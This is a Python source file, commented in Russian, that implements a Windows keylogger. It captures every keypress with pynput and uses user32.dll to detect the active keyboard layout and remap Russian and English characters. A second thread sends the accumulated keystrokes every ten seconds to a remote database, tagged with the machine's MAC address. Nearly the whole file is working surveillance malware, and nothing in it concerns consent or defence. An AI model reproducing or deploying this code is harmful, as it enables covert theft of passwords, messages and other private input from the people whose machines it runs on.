import time
import uuid
import ctypes
import threading
from sql_connect import db_connector
from pynput import keyboard
from layout_mapping import eng_to_rus, rus_to_eng, language_codes


def detect_keyboard_layout_win():
    '''
    Определение раскладки клавиатуры
    
    Происходит подключение файла user32.dll, представление его в в
    и id потока, который его обрабатывает. В переменную klid записывается номер раскладки клавиатуры, полученный из
    id потока. Номер раскладки представляет собой 10-чное представление 32 битного числа. Первые 16 бит служебные,
    вторые 16 бит - непосредственно сам номер раскладки, который нас интересует. Производится побитовое умножение на 
    2 ** 16 - 1, то есть в двоичном представлении это 16 единиц в младших разрядах, которые нас интересуют. Полученное
    число переводится в 16-ричное представление и значение сравнивается со словарем раскладок, возвращается название раскладки.
    
    '''
    user32 = ctypes.WinDLL('user32.dll', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes['0x409']
    return language


def on_press(key):
    global text
    print(f'{key} pressed')

    special_keys = [
        keyboard.Key.enter, keyboard.Key.tab, keyboard.Key.space, keyboard.Key.shift, keyboard.Key.shift_r,
        keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.esc,
        keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.home, keyboard.Key.end,
        keyboard.Key.page_up, keyboard.Key.page_down, keyboard.Key.insert, keyboard.Key.delete, keyboard.Key.up,
        keyboard.Key.down, keyboard.Key.left, keyboard.Key.right, keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3,
        keyboard.Key.f4, keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8, keyboard.Key.f9,
        keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12, keyboard.Key.backspace
    ]

    if key in special_keys:
        if key == keyboard.Key.enter:
            text += '\n'
        elif key == keyboard.Key.tab:
            text += '\t'
        elif key == keyboard.Key.space:
            text += ' '
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        else:
            pass
    else:
        if detect_keyboard_layout_win() == 'Russian':
            try:
                text += eng_to_rus[str(key).strip("'")]
            except KeyError:
                text += str(key).strip("'")
        else:
            try:
                text += rus_to_eng[str(key).strip("'")]
            except KeyError:
                text += str(key).strip("'")


def listener():
    print('Listener started')
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join() # Поток работает до тех пор, пока мы сами его не убьем =)


def db_updater():
    cursor = connection.cursor()
    while True:
        global text
        if len(text) > 20:
            print('Data is ready to be added to the database')
            cursor.execute("SELECT * FROM users_data WHERE username = %s", (mac_address))
            result = cursor.fetchone()
            if result:
                new_content = result[2] + '\n' + text 
                cursor.execute("UPDATE users_data SET content = %s WHERE username = %s", (new_content, mac_address))
                connection.commit()
                text = ''
                print(f'Updated user {mac_address} with new content.')
            else:  
                print('User does not exist, adding new user...')
                cursor.execute("INSERT INTO users_data (username, content) VALUES (%s, %s)", (mac_address, text))
                connection.commit()
                text = ''
                print('Data added')

        time.sleep(10)


if __name__ == '__main__':
    text = ''
    mac_address = uuid.getnode()
    connection = db_connector()
    thread1= threading.Thread(target=listener)
    thread2 = threading.Thread(target=db_updater)
    thread1.start()
    thread2.start()
